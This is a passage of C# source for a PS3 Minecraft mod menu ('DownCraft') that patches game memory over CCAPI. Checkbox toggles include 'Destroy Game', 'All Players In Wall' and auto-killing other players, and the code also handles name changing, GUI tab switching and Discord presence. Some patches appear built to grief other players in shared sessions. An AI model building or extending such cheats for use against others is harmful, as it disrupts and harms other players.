            openFileDialog1.InitialDirectory = System.IO.Path.Combine(System.IO.Path.GetDirectoryName(Application.ExecutablePath), @"Backgrounds");
            openFileDialog1.Filter = "Images File (*.gif)|*.gif";
            openFileDialog1.FileName = "Background DownCraft";
            openFileDialog1.FilterIndex = 2;
            openFileDialog1.RestoreDirectory = true;

            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    if ((myStream = openFileDialog1.OpenFile()) != null)
                    {
                        using (myStream)
                        {
                            pictureBox1.Image = Image.FromFile(openFileDialog1.FileName);
                            pictureBox6.Image = Image.FromFile(openFileDialog1.FileName);
                            pictureBox7.Image = Image.FromFile(openFileDialog1.FileName);
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error, can't found or add background images !");
                }
            }
        }

        private void metroCheckBox18_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox18.Checked)  //////Hurt Cam
            {
                PS3.SetMemory(0x00A972B0, new byte[] { 0x00, 0x00 }); ////MODIFED VALUE
            }
            else
            {
                PS3.SetMemory(0x00A972B0, new byte[] { 0x40, 0x49 }); ////SET to default
            }
        }

        private void metroCheckBox22_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox22.Checked)  //////Destroy Game !
            {
                PS3.SetMemory(0x00B21C96, new byte[] { 0x48 }); ////MODIFED VALUE
            }
            else
            {
                PS3.SetMemory(0x00B21C96, new byte[] { 0x08 }); ////SET to default
            }
        }

        private void metroButton29_Click(object sender, EventArgs e)
        {
            PS3.SetMemory(0x3000ABE4, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

            byte[] bytes = Encoding.ASCII.GetBytes(metroLabel8.Text);

            PS3.SetMemory(0x3000ABE4, bytes);

            timer1.Start();
            metroLabel3.Text = PS3.Extension.ReadString(0x3000ABE4); //////NAME SLOT OF MINECRAFT
            PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nReset Name Added");
        }

        private void metroButton28_Click(object sender, EventArgs e)
        {
            PS3.SetMemory(0x3000ABE4, new byte[] { 0xC2, 0xA7, 0x63, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

            byte[] bytes = Encoding.ASCII.GetBytes(metroTextBox2.Text + "");

            PS3.SetMemory(0x3000ABE7, bytes);

            timer1.Start();
            metroLabel3.Visible = true;
            metroLabel3.Text = PS3.Extension.ReadString(0x3000ABE4); //////NAME SLOT OF MINECRAFT
            PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nName Changer Colored RED Added !");
        }

        private void metroLabel3_Click(object sender, EventArgs e)
        {

        }

        private void bunifuFlatButton1_Click(object sender, EventArgs e)
        {
            indicator.Top = ((Bunifu.Framework.UI.BunifuFlatButton)sender).Top - 0;
            this.metroTabControl1.SelectedTab = this.metroTabPage1;
        }

        private void bunifuFlatButton2_Click(object sender, EventArgs e)
        {
            indicator.Top = ((Bunifu.Framework.UI.BunifuFlatButton)sender).Top - 0;
            this.metroTabControl1.SelectedTab = this.metroTabPage2;
        }

        private void bunifuFlatButton3_Click(object sender, EventArgs e)
        {
            indicator.Top = ((Bunifu.Framework.UI.BunifuFlatButton)sender).Top - 0;
            this.metroTabControl1.SelectedTab = this.metroTabPage3;
        }

        private void bunifuFlatButton4_Click(object sender, EventArgs e)
        {
            indicator.Top = ((Bunifu.Framework.UI.BunifuFlatButton)sender).Top - 0;
            this.metroTabControl1.SelectedTab = this.metroTabPage4;
        }

        private void bunifuFlatButton5_Click(object sender, EventArgs e)
        {
            indicator.Top = ((Bunifu.Framework.UI.BunifuFlatButton)sender).Top - 0;
            this.metroTabControl1.SelectedTab = this.metroTabPage5;
        }

        private void bunifuFlatButton6_Click(object sender, EventArgs e)
        {
            indicator.Top = ((Bunifu.Framework.UI.BunifuFlatButton)sender).Top - 0;
            this.metroTabControl1.SelectedTab = this.metroTabPage5;
        }

        private void bunifuFlatButton7_Click(object sender, EventArgs e)
        {

        }

        private void bunifuFlatButton1_Click_1(object sender, EventArgs e)
        {
            indicator.Top = ((Bunifu.Framework.UI.BunifuFlatButton)sender).Top - 0;
            this.metroTabControl1.SelectedTab = this.metroTabPage1;
        }

        private void discordswap_Tick(object sender, EventArgs e)
        {
            Discord1();
            Thread.Sleep(2000);
            Discord2();
            Thread.Sleep(2000);
            Discord3();
            Thread.Sleep(2000);
        }

        void Discord1()
        {
            this.handlers = default(DiscordRpc.EventHandlers);
            DiscordRpc.Initialize("635947456550666280", ref this.handlers, true, null);
            this.handlers = default(DiscordRpc.EventHandlers);
            DiscordRpc.Initialize("635947456550666280", ref this.handlers, true, null);
            this.presence.details = "1";
            this.presence.state = "https://downcraft.xyz";
            this.presence.largeImageKey = "logo1";
            this.presence.smallImageKey = "logo";
            this.presence.largeImageText = "logo";
            DiscordRpc.UpdatePresence(ref this.presence);
        }

        void Discord2()
        {
            this.handlers = default(DiscordRpc.EventHandlers);
            DiscordRpc.Initialize("635947456550666280", ref this.handlers, true, null);
            this.handlers = default(DiscordRpc.EventHandlers);
            DiscordRpc.Initialize("635947456550666280", ref this.handlers, true, null);
            this.presence.details = "2";
            this.presence.state = "https://downcraft.xyz";
            this.presence.largeImageKey = "logo1";
            this.presence.smallImageKey = "logo";
            this.presence.largeImageText = "logo";
            DiscordRpc.UpdatePresence(ref this.presence);
        }

        void Discord3()
        {
            this.handlers = default(DiscordRpc.EventHandlers);
            DiscordRpc.Initialize("635947456550666280", ref this.handlers, true, null);
            this.handlers = default(DiscordRpc.EventHandlers);
            DiscordRpc.Initialize("635947456550666280", ref this.handlers, true, null);
            this.presence.details = "3";
            this.presence.state = "https://downcraft.xyz";
            this.presence.largeImageKey = "logo1";
            this.presence.smallImageKey = "logo";
            this.presence.largeImageText = "logo";
            DiscordRpc.UpdatePresence(ref this.presence);
        }

        private void metroCheckBox39_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox39.Checked)  /////ROBLOX ANIM
            {
                PS3.SetMemory(0x002341D0, new byte[] { 0xC3 }); ////MODIFED VALUE
            }
            else
            {
                PS3.SetMemory(0x002341D0, new byte[] { 0xC0 }); ////SET to default
            }
        }

        private void metroCheckBox40_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox40.Checked)  ////Infinite Oxygen In Water
            {
                PS3.SetMemory(0x0039DE28, new byte[] { 0x41 }); ////MODIFED VALUE
            }
            else
            {
                PS3.SetMemory(0x0039DE28, new byte[] { 0x40 }); ////SET to default
            }
        }

        private void metroTabPage1_Click(object sender, EventArgs e)
        {

        }

        private void metroCheckBox54_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox54.Checked)  ///////Optimize Chunks Load
            {
                PS3.SetMemory(0x00B21C60, new byte[] { 0x40, 0xD7, 0x00, 0x00 }); ////MODIFED VALUE
            }
            else
            {
                PS3.SetMemory(0x00B21C60, new byte[] { 0x40, 0x30, 0x00, 0x00 }); ////MODIFED VALUE
            }
        }

        private void metroCheckBox55_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox55.Checked)  ////Creative Inventory In Lobby
            {
                PS3.SetMemory(0x00AED18F, new byte[] { 0x01 }); ////MODIFED VALUE
            }
            else
            {
                PS3.SetMemory(0x00AED18F, new byte[] { 0x00 }); ////SET to default
            }
        }

        private void metroCheckBox56_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox56.Checked)  ////Auto Crouch On Movement
            {
                PS3.SetMemory(0x00B0143F, new byte[] { 0x0F }); ////MODIFED VALUE
            }
            else
            {
                PS3.SetMemory(0x00B0143F, new byte[] { 0x0E }); ////SET to default
            }
        }

        private void metroCheckBox57_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox57.Checked)  ////All Players In Wall
            {
                PS3.SetMemory(0x0022FDC8, new byte[] { 0x4E, 0x80, 0x00, 0x20 }); ////MODIFED VALUE
            }
            else
            {
                PS3.SetMemory(0x0022FDC8, new byte[] { 0xF8, 0x21, 0xFF, 0x11 }); ////SET to default
            }
        }

        private void metroCheckBox58_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox58.Checked)  ////Auto Kill Players After He Is Dead
            {
                PS3.SetMemory(0x003A8678, new byte[] { 0x4E, 0x80, 0x00, 0x20 }); ////MODIFED VALUE
            }
            else
            {
                PS3.SetMemory(0x003A8678, new byte[] { 0xF8, 0x21, 0xFF, 0x81 }); ////SET to default
            }
        }
    }
} 